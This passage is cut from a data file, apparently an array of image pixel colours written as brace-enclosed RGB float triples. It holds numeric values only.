788,0.612,0.447},{0.765,0.58,0.42},{0.733,0.549,0.38},{0.698,0.514,0.341},{0.671,0.467,0.294},{0.635,0.431,0.247},{0.635,0.443,0.188},{0.855,0.706,0.231},{0.827,0.914,1},{0.827,0.914,1},
{0.831,0.918,1},{0.835,0.918,1},{0.847,0.922,0.988},{0.851,0.925,0.992},{0.855,0.929,0.996},{0.855,0.929,0.996},{0.863,0.929,0.992},{0.863,0.929,0.992},{0.863,0.929,0.992},{0.863,0.929,0.992},{0.878,0.918,0.953},{0.902,0.859,0.757},{0.867,0.788,0.635},{0.894,0.827,0.71},{0.906,0.851,0.737},{0.918,0.855,0.725},{0.894,0.824,0.698},{0.894,0.804,0.647},{0.863,0.737,0.541},{0.835,0.694,0.463},{0.847,0.678,0.443},{0.831,0.659,0.412},{0.816,0.643,0.376},{0.816,0.647,0.4},{0.851,0.69,0.482},{0.886,0.765,0.592},{0.882,0.757,0.584},{0.894,0.788,0.647},{0.918,0.831,0.702},{0.906,0.816,0.675},{0.902,0.808,0.651},{0.922,0.816,0.675},{0.925,0.824,0.694},{0.941,0.855,0.733},{0.961,0.894,0.78},{0.984,0.925,0.827},{0.98,0.918,0.816},{0.949,0.871,0.773},{0.949,0.804,0.322},{0.863,0.659,0.31},{0.8,0.639,0.576},{0.757,0.588,0.518},{0.753,0.573,0.486},{0.784,0.616,0.518},{0.796,0.651,0.537},{0.816,0.678,0.569},{0.82,0.682,0.573},{0.835,0.694,0.58},{0.827,0.678,0.569},{0.816,0.667,0.561},{0.788,0.643,0.533},{0.769,0.627,0.494},{0.749,0.6,0.459},
{0.725,0.565,0.439},{0.722,0.549,0.427},{0.718,0.537,0.408},{0.694,0.502,0.365},{0.69,0.486,0.341},{0.655,0.447,0.302},{0.627,0.408,0.263},{0.6,0.38,0.231},{0.592,0.361,0.22},{0.561,0.333,0.192},{0.525,0.306,0.161},{0.498,0.278,0.133},{0.498,0.263,0.118},{0.494,0.243,0.102},{0.486,0.227,0.094},{0.482,0.227,0.082},{0.475,0.22,0.071},{0.471,0.216,0.067},{0.459,0.204,0.055},{0.455,0.2,0.051},{0.435,0.18,0.039},{0.408,0.149,0.024},{0.431,0.176,0.039},{0.529,0.278,0.102},{0.624,0.384,0.2},{0.675,0.475,0.29},{0.757,0.569,0.4},{0.792,0.616,0.459},{0.824,0.659,0.51},{0.824,0.663,0.525},{0.839,0.671,0.545},{0.847,0.678,0.553},{0.839,0.686,0.553},{0.824,0.678,0.529},{0.816,0.667,0.51},{0.784,0.616,0.459},{0.784,0.608,0.447},{0.776,0.6,0.439},{0.749,0.565,0.408},{0.71,0.525,0.357},{0.667,0.478,0.314},{0.631,0.431,0.255},{0.624,0.416,0.204},{0.8,0.62,0.196},{0.973,0.835,0.29},{0.827,0.91,1},{0.827,0.91,1},{0.827,0.91,1},{0.831,0.918,1},{0.843,0.922,0.996},{0.847,0.922,0.996},{0.851,0.925,0.992},{0.851,0.925,0.992},
{0.859,0.925,0.992},{0.863,0.929,0.996},{0.863,0.929,0.992},{0.863,0.929,0.992},{0.878,0.922,0.973},{0.918,0.878,0.796},{0.91,0.816,0.663},{0.875,0.8,0.631},{0.922,0.863,0.753},{0.914,0.855,0.733},{0.918,0.847,0.714},{0.906,0.82,0.675},{0.89,0.788,0.592},{0.871,0.745,0.525},{0.867,0.722,0.498},{0.871,0.718,0.486},{0.855,0.71,0.467},{0.847,0.698,0.459},{0.867,0.71,0.49},{0.871,0.757,0.569},{0.886,0.788,0.627},{0.906,0.816,0.706},{0.933,0.859,0.769},{0.929,0.855,0.741},{0.91,0.835,0.714},{0.941,0.878,0.769},{0.969,0.91,0.8},{0.961,0.906,0.792},{0.953,0.906,0.796},{0.984,0.949,0.859},{0.992,0.957,0.886},{0.949,0.914,0.812},{0.961,0.839,0.427},{0.867,0.675,0.388},{0.8,0.635,0.576},{0.753,0.557,0.471},{0.725,0.529,0.424},{0.729,0.541,0.435},{0.757,0.592,0.471},{0.8,0.659,0.537},{0.812,0.675,0.549},{0.827,0.682,0.565},{0.816,0.667,0.561},{0.8,0.655,0.549},{0.788,0.643,0.537},{0.776,0.635,0.51},{0.765,0.62,0.478},{0.729,0.576,0.447},{0.71,0.549,0.424},{0.714,0.537,0.412},{0.698,0.51,0.376},{0.694,0.49,0.349},{0.667,0.455,0.318},
{0.639,0.42,0.275},{0.612,0.388,0.247},{0.6,0.376,0.231},{0.565,0.345,0.2},{0.533,0.318,0.165},{0.514,0.294,0.145},{0.506,0.267,0.122},{0.502,0.251,0.106},{0.49,0.231,0.086},{0.486,0.227,0.075},{0.478,0.224,0.071},{0.471,0.216,0.063},{0.463,0.2,0.051},{0.459,0.2,0.051},{0.431,0.176,0.027},{0.408,0.145,0.016},{0.408,0.157,0.024},{0.486,0.239,0.078},{0.596,0.365,0.176},{0.659,0.455,0.271},{0.729,0.541,0.361},{0.773,0.6,0.431},{0.804,0.631,0.478},{0.824,0.643,0.506},{0.827,0.651,0.518},{0.831,0.655,0.525},{0.82,0.671,0.537},{0.82,0.678,0.529},{0.82,0.667,0.51},{0.796,0.631,0.475},{0.78,0.604,0.443},{0.757,0.573,0.412},{0.729,0.541,0.388},{0.686,0.49,0.333},{0.647,0.455,0.278},{0.612,0.408,0.204},{0.741,0.561,0.208},{0.925,0.796,0.259},{0.984,0.878,0.329},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.835,0.918,1},{0.839,0.922,1},{0.847,0.922,0.992},{0.851,0.925,0.992},{0.855,0.922,0.992},{0.859,0.925,0.996},{0.863,0.929,0.996},{0.863,0.929,0.992},{0.878,0.925,0.98},{0.918,0.89,0.835},
{0.914,0.843,0.698},{0.894,0.812,0.635},{0.91,0.835,0.725},{0.933,0.871,0.769},{0.922,0.863,0.753},{0.902,0.831,0.702},{0.906,0.816,0.647},{0.886,0.765,0.569},{0.882,0.765,0.565},{0.882,0.749,0.541},{0.863,0.729,0.533},{0.882,0.761,0.569},{0.867,0.737,0.525},{0.875,0.765,0.588},{0.898,0.808,0.663},{0.902,0.827,0.729},{0.922,0.855,0.788},{0.925,0.859,0.769},{0.922,0.851,0.741},{0.929,0.878,0.773},{0.973,0.933,0.839},{0.98,0.937,0.847},{0.973,0.929,0.831},{0.949,0.922,0.839},{0.992,0.969,0.898},{0.976,0.949,0.859},{0.961,0.859,0.533},{0.875,0.714,0.498},{0.816,0.643,0.588},{0.749,0.541,0.443},{0.714,0.502,0.396},{0.698,0.494,0.373},{0.729,0.545,0.42},{0.78,0.62,0.494},{0.792,0.647,0.514},{0.804,0.663,0.529},{0.804,0.659,0.549},{0.796,0.651,0.545},{0.82,0.675,0.565},{0.796,0.651,0.529},{0.78,0.635,0.498},{0.745,0.596,0.467},{0.729,0.576,0.447},{0.729,0.553,0.42},{0.71,0.525,0.392},{0.69,0.498,0.361},{0.678,0.467,0.333},{0.655,0.435,0.298},{0.624,0.404,0.267},{0.6,0.384,0.239},{0.569,0.353,0.204},{0.541,0.325,0.173},{0.525,0.306,0.153},
{0.533,0.29,0.149},{0.518,0.267,0.118},{0.514,0.251,0.098},{0.506,0.243,0.086},{0.478,0.224,0.067},{0.471,0.216,0.059},{0.478,0.212,0.059},{0.463,0.196,0.043},{0.435,0.176,0.027},{0.42,0.153,0.02},{0.388,0.137,0.012},{0.471,0.224,0.067},{0.569,0.341,0.153},{0.639,0.431,0.243},{0.686,0.506,0.322},{0.745,0.569,0.4},{0.78,0.604,0.451},{0.804,0.624,0.482},{0.816,0.643,0.494},{0.824,0.651,0.51},{0.816,0.655,0.518},{0.812,0.655,0.51},{0.808,0.639,0.486},{0.792,0.62,0.467},{0.765,0.588,0.427},{0.741,0.553,0.392},{0.698,0.506,0.345},{0.667,0.463,0.294},{0.639,0.424,0.247},{0.698,0.498,0.184},{0.89,0.745,0.212},{0.973,0.863,0.302},{0.98,0.867,0.322},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.824,0.91,1},{0.827,0.914,1},{0.835,0.922,1},{0.847,0.922,0.992},{0.851,0.925,0.992},{0.855,0.925,0.992},{0.859,0.925,0.996},{0.863,0.929,0.996},{0.863,0.929,0.992},{0.867,0.929,0.988},{0.918,0.91,0.894},{0.929,0.886,0.784},{0.937,0.851,0.714},{0.918,0.847,0.718},{0.941,0.878,0.78},{0.925,0.871,0.788},{0.914,0.855,0.757},
{0.914,0.831,0.698},{0.898,0.788,0.612},{0.886,0.792,0.631},{0.886,0.784,0.612},{0.882,0.765,0.592},{0.902,0.804,0.69},{0.878,0.784,0.647},{0.886,0.784,0.639},{0.898,0.812,0.675},{0.922,0.859,0.769},{0.925,0.867,0.812},{0.925,0.867,0.788},{0.933,0.863,0.765},{0.925,0.871,0.776},{0.98,0.949,0.871},{0.988,0.961,0.886},{0.992,0.957,0.882},{0.976,0.945,0.875},{0.984,0.961,0.894},{0.988,0.969,0.902},{0.969,0.89,0.671},{0.871,0.733,0.588},{0.812,0.635,0.588},{0.753,0.541,0.439},{0.706,0.482,0.376},{0.69,0.463,0.341},{0.694,0.49,0.361},{0.729,0.549,0.416},{0.776,0.616,0.478},{0.792,0.647,0.518},{0.804,0.659,0.549},{0.804,0.659,0.549},{0.82,0.675,0.565},{0.808,0.663,0.545},{0.788,0.647,0.51},{0.769,0.624,0.49},{0.745,0.592,0.459},{0.729,0.557,0.42},{0.722,0.537,0.404},{0.69,0.51,0.369},{0.69,0.49,0.353},{0.663,0.459,0.318},{0.635,0.431,0.286},{0.596,0.392,0.239},{0.561,0.357,0.204},{0.565,0.349,0.196},{0.529,0.314,0.161},{0.537,0.29,0.145},{0.518,0.271,0.118},{0.514,0.251,0.094},{0.498,0.239,0.082},{0.482,0.227,0.071},{0.478,0.224,0.067},
{0.482,0.216,0.063},{0.463,0.2,0.043},{0.435,0.176,0.027},{0.42,0.157,0.02},{0.388,0.137,0.012},{0.439,0.196,0.039},{0.541,0.318,0.125},{0.608,0.396,0.212},{0.655,0.455,0.275},{0.714,0.529,0.365},{0.753,0.576,0.412},{0.78,0.604,0.451},{0.796,0.624,0.471},{0.796,0.624,0.486},{0.8,0.627,0.486},{0.8,0.635,0.478},{0.792,0.608,0.459},{0.769,0.584,0.435},{0.737,0.561,0.4},{0.698,0.514,0.349},{0.659,0.463,0.298},{0.639,0.439,0.243},{0.702,0.51,0.204},{0.863,0.733,0.196},{0.969,0.863,0.306},{0.984,0.875,0.337},{0.957,0.812,0.227},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.831,0.918,1},{0.839,0.925,1},{0.851,0.918,1},{0.855,0.929,0.996},{0.855,0.929,0.996},{0.863,0.929,1},{0.863,0.929,1},{0.863,0.937,0.996},{0.898,0.918,0.933},{0.933,0.91,0.875},{0.929,0.886,0.792},{0.933,0.886,0.78},{0.933,0.886,0.792},{0.933,0.882,0.824},{0.918,0.878,0.82},{0.914,0.855,0.765},{0.902,0.816,0.69},{0.906,0.851,0.78},{0.89,0.796,0.635},{0.898,0.808,0.706},{0.89,0.824,0.733},
{0.894,0.859,0.816},{0.894,0.816,0.706},{0.894,0.816,0.675},{0.918,0.851,0.761},{0.914,0.859,0.788},{0.902,0.847,0.78},{0.922,0.863,0.776},{0.933,0.878,0.788},{0.976,0.925,0.851},{0.992,0.949,0.875},{0.996,0.965,0.882},{0.996,0.961,0.902},{0.996,0.965,0.875},{0.98,0.945,0.882},{0.898,0.827,0.663},{0.847,0.71,0.616},{0.737,0.545,0.502},{0.714,0.514,0.42},{0.686,0.447,0.329},{0.694,0.451,0.314},{0.69,0.455,0.318},{0.702,0.49,0.353},{0.761,0.58,0.427},{0.78,0.62,0.467},{0.8,0.651,0.518},{0.82,0.667,0.553},{0.827,0.678,0.565},{0.82,0.667,0.553},{0.804,0.655,0.541},{0.792,0.639,0.525},{0.757,0.608,0.486},{0.722,0.576,0.443},{0.722,0.557,0.427},{0.698,0.518,0.376},{0.686,0.502,0.361},{0.659,0.467,0.329},{0.647,0.439,0.306},{0.627,0.42,0.275},{0.592,0.373,0.224},{0.573,0.357,0.204},{0.561,0.329,0.18},{0.545,0.294,0.145},{0.541,0.29,0.141},{0.522,0.271,0.11},{0.522,0.255,0.102},{0.494,0.239,0.075},{0.494,0.239,0.075},{0.482,0.224,0.059},{0.467,0.204,0.039},{0.439,0.176,0.027},{0.416,0.157,0.024},{0.376,0.129,0.008},{0.412,0.173,0.016},
{0.514,0.302,0.094},{0.573,0.369,0.18},{0.624,0.424,0.255},{0.678,0.49,0.322},{0.722,0.541,0.365},{0.749,0.576,0.412},{0.769,0.6,0.435},{0.776,0.608,0.443},{0.776,0.62,0.451},{0.769,0.612,0.443},{0.761,0.576,0.427},{0.741,0.553,0.392},{0.702,0.518,0.349},{0.667,0.471,0.302},{0.627,0.42,0.239},{0.71,0.518,0.2},{0.906,0.753,0.243},{0.969,0.859,0.314},{0.984,0.878,0.349},{0.953,0.804,0.216},{0.902,0.71,0.09},{0.824,0.902,1},{0.824,0.902,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.835,0.922,1},{0.851,0.918,1},{0.851,0.925,0.992},{0.855,0.929,0.996},{0.863,0.929,1},{0.863,0.929,1},{0.863,0.929,0.996},{0.882,0.918,0.976},{0.91,0.922,0.945},{0.918,0.91,0.878},{0.933,0.91,0.859},{0.929,0.906,0.831},{0.937,0.898,0.835},{0.914,0.882,0.831},{0.925,0.89,0.859},{0.91,0.843,0.745},{0.922,0.878,0.855},{0.894,0.82,0.714},{0.898,0.843,0.776},{0.894,0.867,0.851},{0.906,0.89,0.89},{0.898,0.847,0.765},{0.898,0.831,0.694},{0.922,0.859,0.761},{0.906,0.843,0.769},{0.882,0.816,0.737},
{0.902,0.843,0.745},{0.945,0.902,0.808},{0.976,0.937,0.851},{0.976,0.929,0.843},{0.988,0.953,0.867},{1,0.965,0.91},{0.996,0.965,0.886},{0.957,0.898,0.824},{0.835,0.698,0.62},{0.678,0.463,0.412},{0.6,0.31,0.278},{0.639,0.384,0.306},{0.694,0.435,0.322},{0.702,0.443,0.31},{0.694,0.443,0.31},{0.706,0.482,0.333},{0.733,0.541,0.388},{0.773,0.596,0.455},{0.804,0.643,0.514},{0.816,0.663,0.549},{0.835,0.682,0.569},{0.82,0.667,0.553},{0.812,0.659,0.545},{0.8,0.647,0.533},{0.776,0.627,0.51},{0.733,0.588,0.455},{0.737,0.569,0.439},{0.702,0.522,0.38},{0.694,0.514,0.373},{0.671,0.482,0.341},{0.659,0.451,0.318},{0.631,0.424,0.278},{0.612,0.392,0.239},{0.596,0.365,0.216},{0.584,0.337,0.192},{0.561,0.31,0.161},{0.545,0.298,0.145},{0.533,0.282,0.122},{0.525,0.259,0.106},{0.506,0.251,0.086},{0.498,0.243,0.078},{0.482,0.22,0.055},{0.467,0.204,0.039},{0.443,0.18,0.031},{0.412,0.153,0.02},{0.365,0.133,0.008},{0.373,0.141,0.016},{0.451,0.231,0.063},{0.525,0.325,0.133},{0.573,0.373,0.204},{0.624,0.435,0.267},{0.663,0.482,0.31},{0.702,0.533,0.369},
{0.722,0.553,0.388},{0.733,0.565,0.4},{0.741,0.573,0.408},{0.741,0.573,0.408},{0.714,0.522,0.373},{0.686,0.49,0.333},{0.651,0.455,0.275},{0.635,0.431,0.239},{0.706,0.522,0.196},{0.914,0.784,0.263},{0.984,0.886,0.333},{0.988,0.878,0.329},{0.953,0.808,0.224},{0.902,0.706,0.071},{0.894,0.659,0.027},{0.824,0.906,1},{0.824,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.831,0.918,1},{0.843,0.918,1},{0.843,0.922,0.996},{0.851,0.922,1},{0.855,0.929,0.996},{0.863,0.933,1},{0.859,0.929,0.996},{0.863,0.918,0.996},{0.882,0.929,0.984},{0.91,0.929,0.949},{0.918,0.91,0.898},{0.925,0.914,0.902},{0.929,0.906,0.871},{0.91,0.894,0.839},{0.914,0.914,0.933},{0.898,0.867,0.773},{0.914,0.882,0.875},{0.898,0.843,0.773},{0.898,0.882,0.871},{0.902,0.914,0.953},{0.906,0.914,0.925},{0.914,0.871,0.816},{0.902,0.839,0.733},{0.929,0.863,0.765},{0.906,0.843,0.749},{0.882,0.82,0.725},{0.918,0.855,0.745},{0.945,0.918,0.816},{0.973,0.949,0.863},{0.992,0.961,0.863},{0.984,0.941,0.839},{0.996,0.961,0.882},
{1,0.969,0.902},{0.89,0.812,0.729},{0.698,0.486,0.435},{0.596,0.286,0.243},{0.506,0.141,0.094},{0.541,0.212,0.157},{0.718,0.424,0.329},{0.706,0.427,0.306},{0.702,0.435,0.302},{0.718,0.478,0.333},{0.729,0.525,0.365},{0.753,0.561,0.416},{0.804,0.635,0.51},{0.808,0.655,0.537},{0.824,0.678,0.561},{0.827,0.682,0.561},{0.824,0.675,0.557},{0.792,0.643,0.529},{0.776,0.624,0.502},{0.757,0.596,0.467},{0.741,0.573,0.443},{0.722,0.541,0.412},{0.71,0.529,0.388},{0.694,0.506,0.361},{0.675,0.471,0.329},{0.651,0.439,0.294},{0.631,0.412,0.259},{0.62,0.384,0.231},{0.592,0.341,0.196},{0.576,0.325,0.176},{0.565,0.314,0.165},{0.545,0.29,0.133},{0.529,0.263,0.102},{0.525,0.263,0.094},{0.51,0.251,0.075},{0.494,0.231,0.059},{0.467,0.204,0.027},{0.431,0.173,0.024},{0.4,0.149,0.012},{0.353,0.122,0.004},{0.318,0.098,0.004},{0.38,0.165,0.035},{0.463,0.251,0.078},{0.51,0.314,0.141},{0.565,0.376,0.196},{0.612,0.427,0.247},{0.647,0.467,0.29},{0.671,0.498,0.325},{0.682,0.514,0.345},{0.682,0.51,0.341},{0.678,0.494,0.329},{0.655,0.459,0.298},{0.624,0.424,0.259},
{0.608,0.408,0.216},{0.745,0.569,0.208},{0.933,0.8,0.282},{0.996,0.898,0.357},{0.996,0.894,0.365},{0.953,0.804,0.204},{0.91,0.71,0.082},{0.894,0.659,0.035},{0.871,0.608,0.008},{0.824,0.91,1},{0.824,0.91,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.835,0.918,1},{0.839,0.925,1},{0.851,0.918,1},{0.855,0.929,0.996},{0.859,0.933,1},{0.859,0.933,1},{0.859,0.922,1},{0.871,0.925,0.988},{0.89,0.929,0.976},{0.906,0.922,0.937},{0.918,0.922,0.957},{0.918,0.918,0.933},{0.906,0.902,0.871},{0.902,0.914,0.941},{0.906,0.89,0.835},{0.906,0.886,0.867},{0.902,0.878,0.875},{0.898,0.914,0.957},{0.906,0.941,0.984},{0.906,0.933,0.965},{0.918,0.882,0.839},{0.918,0.863,0.769},{0.933,0.875,0.776},{0.894,0.835,0.733},{0.894,0.827,0.737},{0.914,0.847,0.733},{0.953,0.929,0.827},{0.976,0.949,0.875},{0.984,0.957,0.867},{1,0.965,0.863},{0.988,0.949,0.863},{0.988,0.945,0.882},{0.827,0.694,0.635},{0.663,0.376,0.318},{0.557,0.196,0.125},{0.471,0.09,0.039},{0.494,0.145,0.082},
{0.761,0.494,0.392},{0.753,0.494,0.373},{0.729,0.467,0.333},{0.722,0.475,0.333},{0.729,0.498,0.345},{0.753,0.545,0.396},{0.8,0.627,0.502},{0.812,0.655,0.537},{0.824,0.678,0.557},{0.827,0.686,0.561},{0.812,0.671,0.549},{0.812,0.659,0.545},{0.784,0.627,0.514},{0.773,0.604,0.478},{0.761,0.588,0.467},{0.737,0.561,0.431},{0.722,0.533,0.396},{0.706,0.518,0.369},{0.686,0.482,0.337},{0.663,0.443,0.302},{0.643,0.427,0.275},{0.62,0.384,0.227},{0.604,0.353,0.208},{0.584,0.333,0.184},{0.573,0.325,0.173},{0.545,0.294,0.137},{0.545,0.282,0.114},{0.533,0.271,0.094},{0.514,0.251,0.075},{0.486,0.224,0.047},{0.471,0.208,0.031},{0.435,0.18,0.024},{0.388,0.141,0.012},{0.337,0.106,0.004},{0.271,0.071,0.004},{0.294,0.098,0.008},{0.388,0.184,0.031},{0.451,0.255,0.09},{0.506,0.318,0.137},{0.545,0.357,0.18},{0.576,0.384,0.208},{0.6,0.42,0.243},{0.62,0.439,0.263},{0.608,0.427,0.251},{0.612,0.42,0.251},{0.604,0.396,0.243},{0.596,0.4,0.169},{0.773,0.588,0.196},{0.945,0.835,0.275},{0.984,0.898,0.369},{0.996,0.882,0.349},{0.969,0.82,0.247},{0.914,0.71,0.094},
{0.894,0.647,0.027},{0.859,0.596,0.008},{0.839,0.557,0.004},{0.82,0.906,1},{0.82,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.831,0.906,1},{0.827,0.914,1},{0.835,0.918,1},{0.839,0.922,1},{0.851,0.922,1},{0.855,0.929,0.996},{0.855,0.929,0.996},{0.855,0.929,1},{0.859,0.922,1},{0.875,0.925,0.996},{0.875,0.933,0.996},{0.882,0.929,0.98},{0.89,0.929,0.992},{0.894,0.925,0.98},{0.91,0.918,0.918},{0.906,0.918,0.953},{0.914,0.91,0.902},{0.89,0.894,0.894},{0.894,0.922,0.976},{0.894,0.937,0.992},{0.894,0.957,0.992},{0.906,0.949,0.984},{0.925,0.898,0.859},{0.925,0.882,0.804},{0.922,0.875,0.78},{0.898,0.843,0.745},{0.89,0.827,0.733},{0.933,0.871,0.757},{0.965,0.937,0.839},{0.984,0.957,0.882},{0.984,0.957,0.871},{0.996,0.969,0.878},{1,0.969,0.894},{0.969,0.906,0.847},{0.824,0.667,0.655},{0.757,0.514,0.467},{0.588,0.212,0.122},{0.475,0.082,0.02},{0.549,0.188,0.118},{0.796,0.569,0.455},{0.776,0.557,0.424},{0.753,0.506,0.365},{0.741,0.502,0.349},{0.745,0.494,0.353},{0.761,0.537,0.396},
{0.804,0.624,0.502},{0.808,0.655,0.537},{0.824,0.682,0.561},{0.827,0.686,0.565},{0.812,0.671,0.549},{0.816,0.667,0.553},{0.8,0.643,0.525},{0.78,0.616,0.49},{0.769,0.6,0.475},{0.753,0.576,0.447},{0.733,0.545,0.412},{0.725,0.533,0.388},{0.706,0.502,0.361},{0.675,0.459,0.318},{0.659,0.443,0.294},{0.639,0.408,0.251},{0.627,0.376,0.227},{0.604,0.353,0.204},{0.588,0.341,0.192},{0.553,0.302,0.145},{0.549,0.286,0.118},{0.541,0.282,0.102},{0.514,0.251,0.075},{0.494,0.231,0.051},{0.475,0.212,0.035},{0.435,0.176,0.012},{0.384,0.133,0.012},{0.314,0.086,0.008},{0.235,0.043,0.004},{0.251,0.075,0.004},{0.314,0.129,0.012},{0.38,0.192,0.039},{0.439,0.247,0.082},{0.459,0.267,0.106},{0.498,0.306,0.145},{0.522,0.329,0.169},{0.533,0.341,0.176},{0.525,0.337,0.169},{0.537,0.325,0.161},{0.584,0.376,0.145},{0.8,0.631,0.196},{0.965,0.851,0.298},{0.996,0.894,0.369},{0.984,0.875,0.329},{0.973,0.796,0.208},{0.918,0.69,0.075},{0.871,0.62,0.02},{0.855,0.576,0.004},{0.824,0.522,0.004},{0.765,0.451,0.004},{0.82,0.906,1},{0.82,0.906,1},{0.827,0.906,1},
{0.827,0.906,1},{0.827,0.906,1},{0.831,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.835,0.918,1},{0.839,0.922,1},{0.847,0.922,0.992},{0.851,0.925,0.992},{0.855,0.929,0.996},{0.855,0.929,0.996},{0.859,0.929,0.996},{0.863,0.929,0.996},{0.871,0.933,0.996},{0.871,0.933,0.996},{0.871,0.933,0.98},{0.89,0.929,0.976},{0.894,0.922,0.973},{0.902,0.914,0.957},{0.902,0.914,0.957},{0.894,0.941,0.988},{0.898,0.949,1},{0.902,0.949,1},{0.91,0.949,0.988},{0.91,0.886,0.831},{0.925,0.89,0.831},{0.933,0.882,0.8},{0.902,0.851,0.757},{0.89,0.831,0.737},{0.953,0.906,0.792},{0.984,0.937,0.855},{0.996,0.953,0.89},{0.992,0.961,0.89},{0.996,0.969,0.886},{0.992,0.969,0.894},{0.945,0.902,0.851},{0.839,0.694,0.675},{0.824,0.616,0.573},{0.655,0.294,0.216},{0.553,0.149,0.071},{0.675,0.353,0.278},{0.847,0.635,0.537},{0.843,0.631,0.514},{0.784,0.549,0.412},{0.765,0.51,0.365},{0.761,0.514,0.369},{0.769,0.553,0.408},{0.812,0.643,0.522},{0.816,0.671,0.565},{0.824,0.686,0.576},{0.831,0.694,0.58},{0.824,0.686,0.576},{0.82,0.671,0.561},
{0.812,0.651,0.529},{0.796,0.627,0.506},{0.78,0.596,0.475},{0.769,0.573,0.443},{0.745,0.553,0.424},{0.725,0.537,0.4},{0.698,0.494,0.361},{0.678,0.467,0.329},{0.667,0.455,0.306},{0.643,0.431,0.278},{0.627,0.392,0.243},{0.612,0.373,0.224},{0.592,0.353,0.2},{0.565,0.325,0.161},{0.557,0.306,0.125},{0.553,0.294,0.106},{0.522,0.263,0.075},{0.498,0.239,0.055},{0.478,0.216,0.047},{0.447,0.18,0.024},{0.376,0.129,0.016},{0.294,0.075,0.008},{0.2,0.035,0.004},{0.192,0.039,0.004},{0.239,0.075,0.004},{0.29,0.118,0.012},{0.341,0.161,0.031},{0.376,0.192,0.043},{0.42,0.224,0.063},{0.435,0.235,0.082},{0.435,0.243,0.094},{0.455,0.255,0.082},{0.584,0.373,0.086},{0.835,0.682,0.204},{0.976,0.882,0.349},{0.988,0.894,0.361},{0.984,0.851,0.275},{0.941,0.78,0.157},{0.914,0.682,0.067},{0.863,0.588,0.004},{0.831,0.537,0.004},{0.78,0.471,0.004},{0.753,0.435,0.004},{0.718,0.408,0.004},{0.82,0.906,1},{0.82,0.906,1},{0.824,0.902,1},{0.827,0.906,1},{0.82,0.914,1},{0.816,0.91,1},{0.824,0.906,1},{0.827,0.906,1},{0.827,0.914,1},
{0.835,0.922,1},{0.847,0.922,0.992},{0.847,0.922,0.988},{0.851,0.925,0.992},{0.855,0.929,0.996},{0.859,0.929,0.996},{0.867,0.933,0.996},{0.867,0.929,0.992},{0.867,0.929,0.992},{0.867,0.937,0.996},{0.878,0.929,0.992},{0.886,0.933,0.996},{0.886,0.918,0.984},{0.89,0.933,0.992},{0.89,0.941,1},{0.906,0.953,1},{0.902,0.949,1},{0.922,0.953,0.973},{0.89,0.851,0.796},{0.937,0.906,0.859},{0.925,0.886,0.816},{0.898,0.847,0.769},{0.867,0.808,0.702},{0.976,0.925,0.82},{0.988,0.945,0.863},{0.992,0.953,0.871},{0.988,0.957,0.875},{1,0.969,0.89},{0.996,0.961,0.89},{0.922,0.875,0.816},{0.882,0.765,0.706},{0.882,0.722,0.655},{0.718,0.42,0.337},{0.714,0.404,0.302},{0.863,0.678,0.596},{0.878,0.718,0.643},{0.855,0.667,0.588},{0.835,0.616,0.514},{0.796,0.549,0.42},{0.769,0.525,0.376},{0.796,0.58,0.439},{0.831,0.663,0.541},{0.839,0.69,0.58},{0.839,0.702,0.588},{0.851,0.714,0.596},{0.835,0.698,0.588},{0.835,0.698,0.584},{0.82,0.671,0.549},{0.812,0.647,0.522},{0.792,0.608,0.486},{0.765,0.569,0.439},{0.757,0.557,0.427},{0.737,0.545,0.408},
{0.706,0.498,0.365},{0.682,0.471,0.337},{0.671,0.455,0.306},{0.647,0.42,0.267},{0.627,0.412,0.255},{0.62,0.396,0.235},{0.596,0.373,0.216},{0.592,0.353,0.184},{0.573,0.322,0.145},{0.561,0.302,0.114},{0.529,0.271,0.082},{0.502,0.239,0.059},{0.475,0.212,0.047},{0.443,0.188,0.027},{0.357,0.122,0.008},{0.263,0.067,0.004},{0.157,0.02,0.004},{0.133,0.024,0.004},{0.153,0.027,0.004},{0.204,0.055,0.004},{0.255,0.09,0.012},{0.302,0.125,0.024},{0.333,0.145,0.031},{0.357,0.157,0.035},{0.412,0.2,0.027},{0.631,0.427,0.082},{0.91,0.773,0.251},{0.984,0.89,0.353},{0.988,0.886,0.341},{0.969,0.8,0.2},{0.933,0.725,0.106},{0.867,0.624,0.031},{0.82,0.529,0.004},{0.804,0.482,0.004},{0.769,0.424,0.004},{0.729,0.392,0.004},{0.733,0.412,0.004},{0.733,0.435,0.004},{0.8,0.906,0.996},{0.8,0.906,0.996},{0.824,0.906,1},{0.827,0.906,1},{0.82,0.91,1},{0.82,0.91,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.831,0.914,1},{0.843,0.918,0.996},{0.847,0.922,0.992},{0.851,0.925,0.992},{0.851,0.925,0.992},{0.859,0.929,0.996},
{0.867,0.933,1},{0.863,0.925,0.992},{0.867,0.929,0.996},{0.867,0.937,1},{0.871,0.929,0.992},{0.871,0.933,1},{0.882,0.933,1},{0.886,0.937,1},{0.89,0.937,1},{0.902,0.949,1},{0.902,0.953,1},{0.922,0.941,0.953},{0.882,0.835,0.769},{0.945,0.922,0.875},{0.918,0.886,0.82},{0.886,0.839,0.773},{0.898,0.827,0.722},{0.988,0.953,0.843},{0.988,0.953,0.863},{0.996,0.961,0.867},{0.992,0.957,0.859},{1,0.961,0.878},{0.996,0.953,0.882},{0.918,0.855,0.8},{0.89,0.784,0.71},{0.89,0.769,0.671},{0.886,0.737,0.627},{0.894,0.757,0.631},{0.929,0.808,0.702},{0.918,0.792,0.741},{0.922,0.769,0.694},{0.871,0.671,0.58},{0.824,0.604,0.486},{0.796,0.573,0.424},{0.835,0.631,0.49},{0.847,0.667,0.561},{0.859,0.71,0.596},{0.851,0.714,0.6},{0.863,0.722,0.604},{0.855,0.714,0.6},{0.831,0.686,0.576},{0.824,0.663,0.553},{0.816,0.639,0.525},{0.82,0.627,0.514},{0.784,0.6,0.467},{0.769,0.58,0.447},{0.753,0.549,0.416},{0.725,0.522,0.384},{0